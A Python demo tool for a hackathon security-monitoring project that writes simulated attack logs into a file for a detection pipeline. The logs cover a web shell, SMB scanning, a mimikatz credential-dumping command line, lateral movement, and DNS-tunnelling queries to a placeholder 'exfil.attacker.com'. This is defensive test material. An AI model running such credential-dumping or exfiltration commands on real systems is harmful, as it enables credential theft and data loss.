"""
AEGIS — Demo Scenarios Injector

Interactive command-line tool for the Hackathon presentation.
This tool acts as the "Attacker View" (Left Screen). It allows the presenter
to inject realistic logs into the AEGIS pipeline step-by-step, observing the
resulting Knowledge Graph updates and Telegram alerts in real-time.

Ref: Methodology §6.2 (Web Shell) and §6.3 (DNS Tunneling)
"""

import argparse
import datetime
import json
import time
import uuid
from pathlib import Path

# Paths
LOGS_DIR = Path(__file__).resolve().parents[1] / "logs"
DEMO_LOG_FILE = LOGS_DIR / "demo.log"

def append_to_log(raw_json_str: str) -> None:
    """Append a raw JSON log string to the demo log file for the Daemon to tail."""
    LOGS_DIR.mkdir(exist_ok=True)
    with open(DEMO_LOG_FILE, "a", encoding="utf-8") as f:
        f.write(raw_json_str + "\n")
        f.flush()

def print_step_header(step_num: int, title: str, description: str) -> None:
    print(f"\n" + "=" * 60)
    print(f"[ATTACKER VIEW] Step {step_num}: {title}")
    print(f"   {description}")
    print("=" * 60)

def wait_for_enter() -> None:
    input("\n[>] Press [ENTER] to execute this step...")
    print("[~] Executing and injecting logs...\n")

def run_webshell_scenario():
    """
    Simulates Attack Scenario 1: Web Shell -> Lateral Movement.
    Ref: Methodology §6.2
    """
    print("\n" + "#" * 60)
    print("[SCENARIO 1] Web Shell -> Lateral Movement")
    print("#" * 60)

    base_time = datetime.datetime.now(datetime.timezone.utc)

    # Step 1: Web Shell Execution (P1)
    print_step_header(1, "Web Shell Execution", "Exploiting apache2.exe to spawn cmd.exe")
    wait_for_enter()
    raw_log = {
        "EventID": 1,
        "UtcTime": base_time.isoformat() + "Z",
        "ProcessId": 5100,
        "Image": "C:\\Windows\\System32\\cmd.exe",
        "CommandLine": "cmd.exe /c whoami",
        "User": "www-data",
        "ParentImage": "C:\\Program Files\\Apache\\apache2.exe",
        "ParentProcessId": 1200,
        "Hashes": "SHA256=12345abcdef"
    }
    append_to_log(json.dumps(raw_log))
    print("[OK] Log injected! Watch the graph for a new P1 alert...")
    time.sleep(2)

    # Step 2: Reconnaissance (P2)
    print_step_header(2, "Network Reconnaissance", "Scanning internal subnets on SMB port 445")
    wait_for_enter()
    for i in range(100, 104):
        raw_log = {
            "EventID": 3,
            "UtcTime": (base_time + datetime.timedelta(seconds=i-90)).isoformat() + "Z",
            "ProcessId": 5100,
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "User": "www-data",
            "SourceIp": "10.0.0.50",
            "SourcePort": 55000 + i,
            "DestinationIp": f"10.0.0.{i}",
            "DestinationPort": 445,
            "Protocol": "tcp"
        }
        append_to_log(json.dumps(raw_log))
        time.sleep(0.1)
    print("[OK] Recon logs injected! (These will be stored and embedded for correlation)")
    time.sleep(2)

    # Step 3: Credential Dumping (P0)
    print_step_header(3, "Credential Dumping", "Executing mimikatz.exe to access lsass.exe memory")
    wait_for_enter()
    raw_log = {
        "EventID": 1,
        "UtcTime": (base_time + datetime.timedelta(seconds=60)).isoformat() + "Z",
        "ProcessId": 8990,
        "Image": "C:\\Windows\\Temp\\mimikatz.exe",
        "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        "User": "SYSTEM",
        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
        "ParentProcessId": 5100,
        "Hashes": "SHA256=abcdef98765"
    }
    append_to_log(json.dumps(raw_log))
    print("[!] P0 Alert injected! A Telegram alert should trigger, and the graph will cluster!")
    time.sleep(2)

    # Step 4: Lateral Movement
    print_step_header(4, "Lateral Movement", "Authenticating to DBSERVER02 using dumped credentials")
    wait_for_enter()
    raw_log = {
        "EventID": 4624,
        "TimeCreated": (base_time + datetime.timedelta(seconds=120)).isoformat().replace("+00:00", "Z"),
        "TargetUserName": "Administrator",
        "TargetDomainName": "CORP",
        "IpAddress": "10.0.0.50",
        "LogonType": 3,
        "WorkstationName": "DBSERVER02"
    }
    append_to_log(json.dumps(raw_log))
    print("[OK] Lateral movement injected! The narrative should update to include DBSERVER02.")
    
    print("\n[END] Scenario Complete! Refer to the Graph and Telegram chat for the final report.")


def run_dns_tunnel_scenario():
    """
    Simulates Attack Scenario 2: DNS Tunneling Exfiltration.
    Ref: Methodology §6.3
    """
    print("\n" + "#" * 60)
    print("[SCENARIO 2] DNS Tunneling Exfiltration")
    print("#" * 60)

    base_time = time.time()

    print_step_header(1, "Data Exfiltration via DNS", "Burst of high-entropy DNS queries to exfil.attacker.com")
    wait_for_enter()

    payloads = [
        "c29tZXNlY3JldGRhdGE", "dGhpcyBpcyBhIHRlc3Q", "ZXhmaWx0cmF0aW9uMQ",
        "YW5vdGhlciBjaHVuaw", "bW9yZSBkYXRhIGhlcmU", "c3RpbGwgZ29pbmc",
        "bmV2ZXIgZ29ubmEgc3RvcA", "a2VlcCBnb2luZw", "ZGF0YSBleGZpbHRyYXRpb24",
        "dHVubmVsaW5nIHRlc3Q", "cGFydCBlbGV2ZW4", "dHdlbHZlIGRuc3M"
    ]

    for i, payload in enumerate(payloads):
        raw_log = {
            "ts": base_time + i,
            "uid": f"CYxbKz{i}",
            "id.orig_h": "10.1.1.50",
            "id.orig_p": 50000 + i,
            "id.resp_h": "8.8.8.8",
            "id.resp_p": 53,
            "query": f"{payload}.exfil.attacker.com",
            "qtype": "A",
            "rcode": 0
        }
        append_to_log(json.dumps(raw_log))
        time.sleep(0.5) # Simulate slight network delay
        print(f"   Injected: {payload}.exfil.attacker.com")
    
    print("\n[OK] DNS burst complete! The graph should generate a cluster for exfil.attacker.com.")
    print("[END] Scenario Complete! Refer to the Graph and Telegram chat for the correlation report.")


def main():
    parser = argparse.ArgumentParser(description="AEGIS Demo Scenarios Injector")
    parser.add_argument("--scenario", choices=["webshell", "dns"], required=True, 
                        help="Choose the attack scenario to simulate.")
    
    args = parser.parse_args()

    if args.scenario == "webshell":
        run_webshell_scenario()
    elif args.scenario == "dns":
        run_dns_tunnel_scenario()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[STOP] Demo simulation aborted by user.")
